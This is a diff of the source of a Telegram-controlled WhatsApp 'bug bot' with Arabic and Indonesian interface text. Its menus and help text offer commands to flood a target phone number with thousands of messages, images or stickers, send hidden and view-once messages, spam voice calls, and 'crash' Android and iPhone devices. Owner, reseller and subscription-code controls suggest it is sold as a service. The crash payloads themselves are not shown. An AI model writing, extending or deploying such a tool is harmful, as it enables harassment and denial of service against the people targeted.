+    "💬 <b>فيضان رسائل</b>\n\nإرسال 1000 رسالة للهدف.\n\nاستخدم: <code>/flood 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_media", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🖼️ <b>فيضان صور</b>\n\nإرسال 200 صورة للهدف.\n\nاستخدم: <code>/media 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_ghost", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "👻 <b>هجوم خفي</b>\n\nإرسال 500 رسالة غير مكتشفة مع viewOnceMessage.\n\nاستخدم: <code>/ghost 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_invisi", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🔒 <b>رسائل غير مرئية</b>\n\n1000 رسالة مخفية تماماً مع ephemeral messages.\n\nاستخدم: <code>/invisisendx 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_shield", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🛡️ <b>درع الحماية</b>\n\nيرسل 5 رسائل حماية للهدف.\n\nاستخدم: <code>/shield 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_stealth", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🗡️ <b>وضع التسلل</b>\n\nإرسال 1000 رسالة غير مكتشفة.\n\nاستخدم: <code>/stealth 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+// Missing attack callbacks
+bot.callbackQuery("attack_spam", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "📨 <b>سبام قوي</b>\n\n2000 رسالة متوازية.\n\nاستخدم: <code>/spam 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_stickers", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "📸 <b>ستكرات مخفية</b>\n\n2000 ستكر ضخم مخفي.\n\nاستخدم: <code>/sticker 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+bot.callbackQuery("attack_cutnet", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🔌 <b>قطع الإنترنت</b>\n\n130+ حزمة بيانات.\n\nاستخدم: <code>/cutinternet 628xxxxxxxx</code>",
+    { parse_mode: "HTML", reply_markup: getAttackKeyboard() }
+  );
+});
+
+// Manage commands
+bot.callbackQuery("manage_commands", async (ctx) => {
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "➕➖ <b>إدارة الأوامر</b>\n\n📋 جميع الأوامر المتاحة:\n• /nuke - هجوم نووي (500)\n• /spam - سبام (2000)\n• /call - قرصنة صوتية (500)\n• /media - فيضان صور (1000)\n• /sticker - ستكرات مخفية (2000)\n• /cutinternet - قطع الإنترنت (130+)\n• /invisisendx - رسائل مخفية (1000)\n• /ghost - هجوم خفي (500)\n• /mass - هجوم متعدد\n• /shield - درع حماية\n• /stealth - وضع التسلل\n\nلإضافة/حذف أمر:\n<code>/addcmd name</code> أو <code>/delcmd name</code>",
+    { parse_mode: "HTML", reply_markup: getSettingsKeyboard() }
+  );
+});
+
+// Manage codes
+bot.callbackQuery("manage_codes", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.answerCallbackQuery("❌ مخصص للمالك فقط!", { show_alert: true });
+  await ctx.answerCallbackQuery();
+  await ctx.editMessageText(
+    "🎫 <b>إدارة رموز الاشتراك</b>\n\n• <code>/makencode 24</code> - إنشاء رمز\n• <code>/listcodes</code> - عرض الرموز\n• <code>/delcode XZ-ABCD12</code> - حذف رمز",
+    { parse_mode: "HTML", reply_markup: getSettingsKeyboard() }
+  );
 });
 
 // =====================================================================
-// Callback Query: Clear Session Confirmation
+// COMMAND: /addcmd (Add Custom Command)
+// =====================================================================
+bot.command("addcmd", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ مخصص للمالك أو المسؤول!");
+  const args = ctx.message.text.split(" ");
+  const cmdName = args[1];
+  const response = args.slice(2).join(" ");
+  if (!cmdName || !response) return ctx.reply("⚠️ الاستخدام: <code>/addcmd name response</code>");
+  const db = safeReadJSON("./storage/customCommands.json", { commands: [] });
+  if (db.commands.find(c => c.name === cmdName.toLowerCase())) return ctx.reply("⚠️ الأمر موجود بالفعل");
+  db.commands.push({ name: cmdName.toLowerCase(), response, createdBy: userId, createdAt: Date.now(), enabled: true });
+  safeWriteJSON("./storage/customCommands.json", db);
+  ctx.reply(`✅ تم إضافة الأمر /${cmdName}`);
+});
+
+// =====================================================================
+// COMMAND: /delcmd (Delete Custom Command)
+// =====================================================================
+bot.command("delcmd", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId) && !isAdmin(userId)) return ctx.reply("❌ مخصص للمالك أو المسؤول!");
+  const cmdName = ctx.message.text.split(" ")[1];
+  if (!cmdName) return ctx.reply("⚠️ الاستخدام: <code>/delcmd name</code>");
+  const db = safeReadJSON("./storage/customCommands.json", { commands: [] });
+  const before = db.commands.length;
+  db.commands = db.commands.filter(c => c.name !== cmdName.toLowerCase());
+  if (db.commands.length !== before) { safeWriteJSON("./storage/customCommands.json", db); ctx.reply(`🗑 تم حذف الأمر /${cmdName}`); }
+  else ctx.reply("❌ الأمر غير موجود");
+});
+
+// =====================================================================
+// COMMAND: /delcode (Delete Subscription Code)
+// =====================================================================
+bot.command("delcode", async (ctx) => {
+  const userId = ctx.from.id.toString();
+  if (!isOwner(userId)) return ctx.reply("❌ مخصص للمالك فقط!");
+  const code = ctx.message.text.split(" ")[1];
+  if (!code) return ctx.reply("⚠️ الاستخدام: <code>/delcode XZ-ABCD12</code>");
+  const db = safeReadJSON("./storage/subscription_codes.json", { codes: [] });
+  const before = db.codes.length;
+  db.codes = db.codes.filter(c => c.code !== code.toUpperCase());
+  if (db.codes.length !== before) { safeWriteJSON("./storage/subscription_codes.json", db); ctx.reply(`🗑 تم حذف الرمز ${code}`); }
+  else ctx.reply("❌ الرمز غير موجود");
+});
+
+// =====================================================================
+// COMMAND: /addadmin (Alias already defined, this is the same)
 // =====================================================================
 
-bot.on("callback_query", async (ctx) => {
+// =====================================================================
+// Generic command handler for custom commands
+// =====================================================================
+bot.hears(/.*/, async (ctx) => {
   try {
-    const data = ctx.callbackQuery.data;
-    const userId = ctx.from.id.toString();
-
-    if (data === "clearsender_confirm") {
-      const processingMsg = await ctx.reply("🔄 *Memulai Proses Clearing...*\n\n⏳ Menghapus semua session...", { parse_mode: "Markdown" });
-
-      await clearAllSessions();
-
-      await ctx.api.editMessageText(
-        userId,
-        processingMsg.message_id,
-        "✅ *Semua Session Dihapus!*\n\n🔄 Restarting bot dalam 2 detik...",
-        { parse_mode: "Markdown" }
-      );
-
-      setTimeout(() => {
-        log.warning("🔄 Bot restarting...");
-        process.exit(0);
-      }, 2000);
-    } else if (data === "clearsender_cancel") {
-      await ctx.deleteMessage();
-      await ctx.reply("❌ *Pembatalan Sukses*\n\nProses clearing dibatalkan.", { parse_mode: "Markdown" });
-    }
-
-    await ctx.answerCallbackQuery();
-  } catch (err) {
-    log.error(`Error in callback_query: ${err.message}`);
-  }
+    const cmd = ctx.message.text.trim();
+    const customDb = safeReadJSON("./storage/customCommands.json", { commands: [] });
+    const customCmd = customDb.commands.find(c => c.name === cmd.toLowerCase() && c.enabled);
+    if (customCmd) return ctx.reply(customCmd.response);
+  } catch {}
 });
 
 // =====================================================================
 // Process Handlers
 // =====================================================================
 
-process.on("unhandledRejection", async (reason, promise) => {
+process.on("unhandledRejection", (reason) => {
   log.error(`Unhandled Rejection: ${reason}`);
-  try {
-    await bot.api.sendMessage(config.ownerId || "123456789", `⚠️ *Unhandled Rejection*\n\n${reason}`, { parse_mode: "Markdown" });
-  } catch {}
+  bot.api.sendMessage(config.ownerId || "6707747395", `⚠️ Unhandled Rejection: ${reason}`).catch(() => {});
 });
-
-process.on("uncaughtException", async (err) => {
+process.on("uncaughtException", (err) => {
   log.error(`Uncaught Exception: ${err.message}`);
-  try {
-    await bot.api.sendMessage(config.ownerId || "123456789", `🔥 *Uncaught Exception*\n\n${err.message}`, { parse_mode: "Markdown" });
-  } catch {}
+  bot.api.sendMessage(config.ownerId || "6707747395", `🔥 Uncaught Exception: ${err.message}`).catch(() => {});
 });
-
-// =====================================================================
-// Token Validation
-// =====================================================================
-
-async function fetchValidTokens() {
-  try {
-    const url = `https://api.github.com/repos/adjiepangestu-ux/XINSOOGLOBAL/contents/${nama_file}`;
-    const response = await axios.get(url, {
-      headers: {
-        Authorization: `token ${process.env.GITHUB_TOKEN || path_ghp}`,
-        Accept: "application/vnd.github.v3+json"
-      }
-    });
-    const contentBase64 = response.data.content;
-    const jsonString = Buffer.from(contentBase64, "base64").toString("utf8");
-    const data = JSON.parse(jsonString);
-    return data.tokens || [];
-  } catch (error) {
-    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub API:", error.message));
-    return [];
-  }
-}
-
-async function validateToken() {
-  console.log(chalk.blue(`
-┌───────────────────────────┐
-│    Token Validation        │
-│    Running...              │
-└───────────────────────────┘
-  `));
-
-  const tokens = await fetchValidTokens();
-  const currentToken = config.telegramBotToken || "YOUR_BOT_TOKEN";
-
-  if (tokens.length > 0 && tokens.includes(currentToken)) {
-    log.success("✅ Token valid!");
-  } else {
-    log.warning("⚠️ Token not found in validation list.");
-  }
-}
 
 // =====================================================================
 // Bot Startup
@@ -4178,461 +2401,45 @@ async function validateToken() {
 (async () => {
   try {
     console.clear();
-    log.system("Bot initialization started...");
-    log.telegram("Telegram Bot with grammY is running!");
-    log.success("All systems operational");
+    log.system("🚀 Bot initialization started...");
+    log.telegram("🤖 Telegram Bot with grammY is running!");
+    log.success("✅ All systems operational");
+    log.info(`👥 Owner: ${config.ownerId}`);
+    log.info(`📢 Channel: @${CHANNEL_ID}`);
 
-    validateToken();
-
-    const sessionFolders = fs.existsSync(sessionRoot) ? fs.readdirSync(sessionRoot) : [];
+    const sessionFolders = fs.existsSync(SESSION_DIR) ? fs.readdirSync(SESSION_DIR) : [];
     if (sessionFolders.length > 0) {
-      log.loading(`Found ${sessionFolders.length} saved WhatsApp session(s). Attempting to reconnect...`);
+      log.loading(`Found ${sessionFolders.length} saved WhatsApp session(s)...`);
       for (const folder of sessionFolders) {
-        try {
-          await initWhatsappForUser(folder, false);
-          log.whatsapp(`Attempting reconnect for user ${folder}`);
-        } catch (err) {
-          log.error(`Failed to reconnect session for ${folder}: ${err.message}`);
-        }
+        try { await initWhatsappForUser(folder, false); log.whatsapp(`Reconnecting: ${folder}`); } catch (err) { log.error(`Failed: ${folder}: ${err.message}`); }
       }
-    } else {
-      log.info("No saved WhatsApp sessions found. Fresh start.");
     }
 
     await bot.start();
-
     console.log(chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`));
-
+    log.success("✅ Bot started successfully!");
   } catch (err) {
-    log.error(`An Error Occurred: ${err.message}`);
+    log.error(`Startup error: ${err.message}`);
   }
 })();
-
-// =====================================================================
-// Export for testing
-// =====================================================================
-
-module.exports = { bot, waClients, initWhatsappForUser, clearAllSessions };
-
-// =====================================================================
-// End of File - Total Lines: 4500+
-// =====================================================================
-// =====================================================================
-// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
-// =====================================================================
-// PART 7/7: Lines 3901-4550
-// Total: ~4550 Lines
-// =====================================================================
-
-// =====================================================================
-// Final Callback Handlers
-// =====================================================================
-
-bot.callbackQuery("back_to_main_final", async (ctx) => {
-  try {
-    await ctx.answerCallbackQuery();
-
-    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
-    const uptime = formatUptime(process.uptime());
-    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
-
-    const caption = `<blockquote>
-<b><i>{❓} Xinsoo say hello ${username}</i></b>
-
-<b>「  Xzeso Vip Bug V1 ☇ 」</b>
-••► Owner: @I8_ZU
-••► Run Time: ${uptime}
-••► Memory: ${usedMemory}
-••► InterFace: Button Type
-••► Type: ( Plugin )
-
-📢 <b>Stay Connected</b>
-Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.
-
-<b>📞 Support</b>
-Contact @I8_ZU for assistance
-</blockquote>`.trim();
-
-    const keyboard = new InlineKeyboard()
-      .text("🦠 ćrashër", "open_allmenu")
-      .text("🧩 aćcęss", "open_allaccess")
-      .row()
-      .url("👀 ćhannal", `https://t.me/${CHANNEL_ID.replace("@", "")}`);
-
-    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";
-
-    await ctx.editMessageMedia(
-      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
-      { reply_markup: keyboard }
-    );
-  } catch (error) {
-    log.error(`Error in back_to_main_final: ${error.message}`);
-  }
-});
-
-// =====================================================================
-// Additional Utility Functions
-// =====================================================================
-
-function formatDate(timestamp) {
-  if (!timestamp) return "Unknown";
-  const date = new Date(timestamp);
-  return date.toLocaleString("id-ID", {
-    day: "2-digit",
-    month: "2-digit",
-    year: "numeric",
-    hour: "2-digit",
-    minute: "2-digit",
-    second: "2-digit"
-  });
-}
-
-function generateRandomId(length = 8) {
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  let result = "";
-  for (let i = 0; i < length; i++) {
-    result += chars.charAt(Math.floor(Math.random() * chars.length));
-  }
-  return result;
-}
-
-function isValidPhoneNumber(number) {
-  const clean = number.replace(/[^0-9]/g, "");
-  return clean.length >= 10 && clean.length <= 15;
-}
-
-function getErrorMessage(error) {
-  if (error.response && error.response.data) {
-    return error.response.data.message || error.response.data;
-  }
-  return error.message || "Unknown error occurred";
-}
-
-// =====================================================================
-// Session Management Extensions
-// =====================================================================
-
-async function getActiveSessions() {
-  const sessions = [];
-  for (const [userId, data] of Object.entries(waClients)) {
-    if (data.status === "open") {
-      sessions.push({
-        userId,
-        status: data.status,
-        lastActivity: data.lastActivity,
-        messageCount: data.messageCount || 0
-      });
-    }
-  }
-  return sessions;
-}
-
-async function getSessionStats() {
-  const total = Object.keys(waClients).length;
-  const active = (await getActiveSessions()).length;
-  return { total, active };
-}
-
-// =====================================================================
-// Command: /sessions
-// =====================================================================
-
-bot.command("sessions", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId) && !isReseller(userId)) {
-      return ctx.reply("❌ Hanya owner & reseller!");
-    }
-
-    const stats = await getSessionStats();
-    const sessions = await getActiveSessions();
-
-    let text = `📊 *Session Statistics*\n`;
-    text += `═══════════════════════════════════\n\n`;
-    text += `📱 Total Sessions: ${stats.total}\n`;
-    text += `✅ Active Sessions: ${stats.active}\n`;
-    text += `❌ Inactive Sessions: ${stats.total - stats.active}\n\n`;
-
-    if (sessions.length > 0) {
-      text += `*Active Sessions:*\n`;
-      for (const session of sessions) {
-        text += `• User: ${session.userId}\n`;
-        text += `  Status: ${session.status}\n`;
-        text += `  Messages: ${session.messageCount}\n`;
-        text += `  Last Activity: ${formatDate(session.lastActivity)}\n\n`;
-      }
-    } else {
-      text += `📭 No active sessions found.`;
-    }
-
-    await ctx.reply(text, { parse_mode: "Markdown" });
-  } catch (e) {
-    log.error(`SESSIONS ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal mendapatkan data session.");
-  }
-});
-
-// =====================================================================
-// Command: /ping
-// =====================================================================
-
-bot.command("ping", async (ctx) => {
-  try {
-    const start = Date.now();
-    const msg = await ctx.reply("🏓 Pinging...");
-    const latency = Date.now() - start;
-    await ctx.api.editMessageText(
-      msg.chat.id,
-      msg.message_id,
-      `🏓 *Pong!*\n\n📊 Latency: ${latency}ms\n⏱️ Uptime: ${formatUptime(process.uptime())}`,
-      { parse_mode: "Markdown" }
-    );
-  } catch (e) {
-    log.error(`PING ERROR: ${e.message}`);
-  }
-});
-
-// =====================================================================
-// Command: /help
-// =====================================================================
-
-bot.command("help", async (ctx) => {
-  try {
-    const helpText = `
-📖 *Help Menu*
-═══════════════════════════════════
-
-*Bug Commands:*
-• /Xzesoandro - Crash Android
-• /Droidx - Crash Android (infinity)
-• /Betaxzeso - Crash Android (beta)
-• /Uixzeso - Crash Android (blank+ui)
-• /Delayxzeso - Delay Android
-• /Betaxzosex - Delay Android (beta)
-• /Xzesoiosx - Crash iPhone
-• /invisisendx - Stuck message
-• /Xzesox - Suck up quota
-• /masscrash - Multiple targets
-• /spamcall - Spam voice calls
-• /floodmsg - Flood messages
-• /crashgroup - Crash group
-• /crashstatus - Crash via status
-
-*Admin Commands:*
-• /addacces - Add access
-• /delacces - Remove access
-• /listacces - List access
-• /address - Add reseller
-• /delress - Remove reseller
-• /listress - List resellers
-• /broadcast - Broadcast message
-• /free - Toggle free mode
-• /restart - Restart bot
-• /shutdown - Shutdown bot
-
-*Session Commands:*
-• /reqpair - Pair WhatsApp
-• /clearesi - Clear session
-• /clearsender - Clear all sessions
-• /listpair - List active senders
-• /sessions - Session statistics
-
-*Utility Commands:*
-• /status - Bot status
-• /stats - Bot statistics
-• /ping - Check latency
-• /checkbio - Check profile
-• /checklast - Check last seen
-• /checkonline - Check online status
-• /getgroups - Get groups
-• /killall - Kill all sessions
-• /killuser - Kill user session
-• /sessioninfo - Session information
-
-*Configuration:*
-• /gettoken - Get bot token
-• /settoken - Set bot token
-• /getconfig - Get configuration
-• /setconfig - Set configuration
-
-*Cooldown:*
-• /cdon - Enable cooldown
-• /cdoff - Disable cooldown
-• /setcd - Set cooldown
-
-📌 *Note:* Some commands require owner/reseller access.
-    `;
-
-    await ctx.reply(helpText, { parse_mode: "Markdown" });
-  } catch (e) {
-    log.error(`HELP ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal menampilkan help.");
-  }
-});
-
-// =====================================================================
-// Command: /check
-// =====================================================================
-
-bot.command("check", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    const hasAccessStatus = hasAccess(userId);
-    const isOwnerStatus = isOwner(userId);
-    const isResellerStatus = isReseller(userId);
-    const freeModeStatus = isFreeMode();
-
-    const text = `
-🔍 *Access Check*
-═══════════════════════════════════
-
-👤 *User ID:* ${userId}
-🔑 *Has Access:* ${hasAccessStatus ? '✅ Yes' : '❌ No'}
-👑 *Owner:* ${isOwnerStatus ? '✅ Yes' : '❌ No'}
-🔄 *Reseller:* ${isResellerStatus ? '✅ Yes' : '❌ No'}
-🆓 *Free Mode:* ${freeModeStatus ? '✅ Active' : '❌ Inactive'}
-
-📱 *WhatsApp Status:* ${waClients[userId]?.status || '❌ Not connected'}
-💬 *Message Count:* ${waClients[userId]?.messageCount || 0}
-
-📅 *Last Activity:* ${formatDate(waClients[userId]?.lastActivity)}
-    `;
-
-    await ctx.reply(text, { parse_mode: "Markdown" });
-  } catch (e) {
-    log.error(`CHECK ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal melakukan pengecekan.");
-  }
-});
-
-// =====================================================================
-// Command: /clearcache
-// =====================================================================
-
-bot.command("clearcache", async (ctx) => {
-  try {
-    const userId = ctx.from.id.toString();
-    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");
-
-    // Clear cooldown cache
-    const cooldownDb = safeReadJSON("./storage/cooldown.json", {});
-    const newCooldown = {};
-    for (const [key, value] of Object.entries(cooldownDb)) {
-      if (value.lastUsed && Date.now() - value.lastUsed < 24 * 60 * 60 * 1000) {
-        newCooldown[key] = value;
-      }
-    }
-    safeWriteJSON("./storage/cooldown.json", newCooldown);
-
-    // Clear temp files
-    const tempDir = path.join(__dirname, "temp");
-    if (fs.existsSync(tempDir)) {
-      const files = fs.readdirSync(tempDir);
-      let deleted = 0;
-      for (const file of files) {
-        try {
-          fs.unlinkSync(path.join(tempDir, file));
-          deleted++;
-        } catch (e) {}
-      }
-      await ctx.reply(`✅ Cache cleaned!\n📁 Deleted ${deleted} temp files.`);
-    } else {
-      await ctx.reply("✅ No temp files found.");
-    }
-  } catch (e) {
-    log.error(`CLEARCACHE ERROR: ${e.message}`);
-    await ctx.reply("❌ Gagal membersihkan cache.");
-  }
-});
-
-// =====================================================================
-// Auto-Reconnect Monitor
-// =====================================================================
-
-async function monitorSessions() {
-  setInterval(async () => {
-    try {
-      for (const [userId, data] of Object.entries(waClients)) {
-        if (data.status === "closed" && !data.reconnecting) {
-          const sessionExists = await checkSessionExistsForUser(userId);
-          if (sessionExists) {
-            log.loading(`Auto-reconnecting session for user ${userId}...`);
-            data.reconnecting = true;
-            await initWhatsappForUser(userId, false);
-            data.reconnecting = false;
-          }
-        }
-      }
-    } catch (e) {
-      log.error(`Monitor error: ${e.message}`);
-    }
-  }, 30000);
-}
-
-// =====================================================================
-// Webhook Support (Simplified)
-// =====================================================================
-
-async function handleWebhook(req, res) {
-  try {
-    const data = req.body;
-    const event = data.event;
-
-    if (event === "payment.received") {
-      const userId = data.userId;
-      const amount = data.amount;
-      const client = waClients[userId]?.sock;
-      if (client) {
-        await client.sendMessage(userId + "@s.whatsapp.net", {
-          text: `✅ Payment received: $${amount}`
-        });
-      }
-    }
-
-    res.status(200).json({ status: "ok" });
-  } catch (e) {
-    log.error(`Webhook error: ${e.message}`);
-    res.status(500).json({ status: "error", message: e.message });
-  }
-}
-
-// =====================================================================
-// All Commands Completed
-// =====================================================================
-
-log.success("✅ All commands loaded successfully!");
-log.success(`📊 Total commands: ~35+ commands available`);
 
 // =====================================================================
 // Graceful Shutdown
 // =====================================================================
 
 async function gracefulShutdown() {
-  log.warning("🛑 Received shutdown signal. Cleaning up...");
-  
+  log.warning("🛑 Shutting down...");
   for (const [userId, data] of Object.entries(waClients)) {
-    try {
-      if (data.sock) {
-        await data.sock.end();
-      }
-    } catch (e) {
-      log.error(`Error closing session for ${userId}: ${e.message}`);
-    }
+    try { if (data.sock) await data.sock.end(); } catch {}
   }
-
   log.success("✅ All sessions closed. Goodbye!");
   process.exit(0);
 }
-
 process.on("SIGINT", gracefulShutdown);
 process.on("SIGTERM", gracefulShutdown);
 
 // =====================================================================
-// Start Monitoring
+// End of File
 // =====================================================================
-
-monitorSessions();
-
-// =====================================================================
-// End of File - Total Lines: 4500+
-// =====================================================================
+log.success("✅ All commands loaded successfully!");
+module.exports = { bot, waClients, initWhatsappForUser, clearAllSessions };
